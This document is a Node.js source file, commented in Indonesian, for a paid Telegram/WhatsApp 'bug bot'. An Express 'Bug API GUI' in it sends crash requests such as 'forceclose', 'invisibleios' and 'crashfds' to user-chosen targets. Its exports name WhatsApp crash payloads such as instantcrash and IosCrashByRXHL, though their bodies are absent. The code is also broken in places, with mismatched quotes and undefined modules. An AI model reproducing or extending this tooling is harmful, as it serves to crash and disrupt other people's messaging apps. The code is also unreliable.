const fs = require('fs');
const {
    default: makeWASocket,
    makeInMemoryStore,
    useMultiFileAuthState,
    useSingleFileAuthState,
    initInMemoryKeyStore,
    fetchLatestBaileysVersion,
    makeWASocket: WASocket,
    AuthenticationState,
    BufferJSON,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessage,
    generateWAMessageContent,
    generateWAMessageFromContent,
    generateMessageID, 
    generateRandomMessageId,   
    prepareWAMessageMedia,
    getContentType,
    mentionedJid,
    relayWAMessage,
    templateMessage,
    InteractiveMessage,
    Header,
    MediaType,
    MessageType,
    MessageOptions,
    MessageTypeProto,
    WAMessageContent,
    WAMessage,
    WAMessageProto,
    WALocationMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMediaUpload,
    WAMessageStatus,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    Presence,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,
    GroupMetadata,
    WAGroupMetadata,
    GroupSettingChange,
    areJidsSameUser,
    ChatModification,
    getStream,
    isBaileys,
    jidDecode,
    processTime,
    ProxyAgent,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    Browsers,
    Browser,
    WAFlag,
    WAContextInfo,
    WANode,
    WAMetric,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    DisconnectReason,
    MediaConnInfo,
    ReconnectMode,
    AnyMessageContent,
    waChatKey,
    WAProto,
    proto,
    BaileysError,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const sessions = new Map();
const sessions_dir = "./sessions";
const file_session = "./active.json";

///
const GITHUB_TOKEN = "";
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
async function fetchValidTokensFromGithub() {
  const url = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${TOKEN_FILE_PATH}`;
  try {
    const response = await axios.get(url, {
      headers: {
        Authorization: `linux ${GITHUB_TOKEN}`,
        Accept: "application/vnd.github.v3.raw",
      },
    });

    const tokenJson = typeof response.data === "string"
      ? JSON.parse(response.data)
      : response.data;

    return tokenJson.tokens || [];
  } catch (err) {
    console.error(chalk.red("❌ Gagal mengambil token dari GitHub:"), err.message);
    return [];
  }
}
async function validateToken() {
  console.clear();
  showBanner();
  console.log(chalk.cyan("🔍 Memulai proses validasi Token Premium... ⛩️"));

  try {
    const validTokens = await fetchValidTokensFromGithub();

    if (!validTokens.includes(BOT_TOKEN)) {
      console.log(chalk.red("❌ Token kamu belum terdaftar!"));
      console.log(
        chalk.yellow("💡 Silakan beli Premium Token dari sang *Shogun* (Owner).")
      );
      process.exit(1);
    }

    console.log(chalk.green("✅ Token diterima! Akses Premium: Aktif ✨"));
    showBotStatus();
    startBot();
    initializeWhatsAppConnections();
  } catch (err) {
    console.log(chalk.red("💥 Gagal memverifikasi Token!"));
    console.error(err);
    process.exit(1);
  }
}

function showBanner() {
  const bannerText = figlet.textSync("xxx", {
    font: "Slant",
    horizontalLayout: "default",
  });
  console.log(gradient.fruit.multiline(bannerText));
}

function showBotStatus() {
  console.log(chalk.magentaBright("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"));
  console.log(`${chalk.cyan("🦠 BOT NAME   :")} Vanegeta`);
  console.log(`${chalk.cyan("💬 Telegram   :")} Tersambung ✅`);
  console.log(`${chalk.cyan("📡 WhatsApp   :")} Sedang Menghubungkan... ⏳`);
  console.log(`${chalk.cyan("👑 Premium    :")} Aktif・有効 ✅`);
  console.log(`${chalk.cyan("👤 Developer  :")} @XAngel_Reals`);
  console.log(`${chalk.cyan("🎌 Channel    :")} https://t.me/ingormationXangel`);
  console.log(chalk.magentaBright("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"));
}

function startBot() {
  console.log(chalk.greenBright("🚀 Siap, Bot Telegram telah aktif! 🧋"));
  console.log(chalk.blueBright("📌 Gunakan perintah melalui Telegram untuk memulai petualanganmu."));
}

validateToken();



///
let sock;


const MAX_CONCURRENT_DEPLOYS = 1; // Batasi 5 deploy bot secara bersamaan
let deployingBots = 0;

async function deployBot(ctx, token, ownerId) {
  if (deployingBots >= MAX_CONCURRENT_DEPLOYS) {
    return ctx.reply(
      `🚧 <b>Terlalu banyak bot yang sedang dideploy</b>\n\nTunggu beberapa saat dan coba lagi.`,
      { parse_mode: "HTML" }
    );
  }

  deployingBots++;

  const botId = `bot_${Date.now()}`;
  const botDir = path.join(BOTS_DIR, botId);

  try {
    // Kirim pesan awal
    ctx.reply(
      `⏳ <b>Bot sedang diproses...</b>\n\nMohon tunggu sebentar.`,
      { parse_mode: "HTML" }
    );

    // Buat direktori bot
    fs.mkdirSync(botDir, { recursive: true });

    // Salin file yang diperlukan ke direktori bot
    fs.copyFileSync("./index.js", path.join(botDir, "index.js"));
    fs.copyFileSync("./package.json", path.join(botDir, "package.json"));
    fs.copyFileSync("./welcome.js", path.join(botDir, "welcome.js"));
    fs.copyFileSync("./addadmin.js", path.join(botDir, "addadmin.js"));
    fs.writeFileSync(
      path.join(botDir, "config.js"),
      `module.exports = { BOT_TOKEN: "${token}", allowedDevelopers: ['${ownerId}'] };`
    );
    fs.copyFileSync("./photo.jpg", path.join(botDir, "photo.jpg"));

    // Install dependencies
    const installProcess = spawn("npm", ["install"], { cwd: botDir, stdio: "inherit" });

    installProcess.on("close", (code) => {
      if (code !== 0) {
        ctx.reply(
          `🚨 <b>Gagal Install Dependencies</b>\n\nError: <code>npm install exited with code ${code}</code>`,
          { parse_mode: "HTML" }
        );
        console.error(`Install error: npm install exited with code ${code}`);
        return;
      }

      // Jalankan bot di background menggunakan spawn
      const botProcess = spawn("node", ["index.js"], {
        cwd: botDir,
        detached: true,
        stdio: "ignore",
      });

      botProcess.unref(); // Pastikan proses tetap berjalan meskipun bot utama mati
      saveBotList(botId, token, ownerId);

      ctx.reply(
        `✅ <b>Bot Berhasil Dideploy dan Dijalankan!</b>\n\n🔑 Token: <code>${token}</code>\n👤 Owner ID: <code>${ownerId}</code>`,
        { parse_mode: "HTML" }
      );
    });
  } catch (err) {
    ctx.reply(
      `🚨 <b>Gagal Membuat Direktori Bot</b>\n\nError: <code>${err.message}</code>`,
      { parse_mode: "HTML" }
    );
    console.error(`Directory error: ${err.message}`);
  } finally {
    deployingBots--;
  }
}




const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));
app.set('view engine', 'ejs');

// Fungsi log otomatis
function logRequest(type, target, status) {
  const log = `${new Date().toISOString()} | ${type} | Target: ${target} | Status: ${status}\n`;
  fs.appendFileSync('logs.txt', log);
}

// Validasi target URL
function validateTarget(url) {
  const pattern = /^https?:\/\/[a-zA-Z0-9.-]+(:[0-9]+)?(\/.*)?$/;
  if (!pattern.test(url)) throw new Error('Invalid target URL');
  return url;
}

// Halaman utama
app.get('/', (req, res) => {
  res.render('index', { message: null });
});

// Handle bug request
app.post('/sendbug', async (req, res) => {
  try {
    const target = validateTarget(req.body.target);
    const type = req.body.type;

    // Pilih endpoint sesuai type
    let endpoint = '';
    if (type === 'forceclose') endpoint = '/forceclose';
    else if (type === 'invisibleios') endpoint = '/delay';
    else if (type === 'forceclose') endpoint = '/forceclose';
    else if (type === 'crashfds") endpoint = '/apicilte';
    else throw new Error('Invalid bug type');

    // Optional delay parameter
    let payload = {};
    if (type === 'invisibleios') payload.delay = parseInt(req.body.delay) || 5;

    const response = await axios.post(`${target}${endpoint}`, payload);
    logRequest(type, target, 'Success');

    res.render('index', { message: `✅ ${type} sent successfully to ${target}` });
  } catch (err) {
    logRequest(req.body.type || 'N/A', req.body.target || 'N/A', 'Failed');
    res.render('index', { message: `❌ Error: ${err.message}` });
  }
});

app.listen(PORT, () => console.log(`Bug API GUI running at http://localhost:${PORT}`));

///funtion nya 




//modul telegram 
module.exports = {
  connectToWhatsApp,
  initializeWhatsAppConnections,
  saveActive,
  sessionPath,
  sessions,
  Ren,
  XtrashVas, ViewOnceXtended, StickerMassageNew, oldDelay, DelayOld2, instantcrash, TrashProtocol, IosCrashByRXHL, iNvsExTendIos, InVsSwIphone, GetSuZoBlank2, CrashChanel, BugGroupJIDS, interactiveCall
};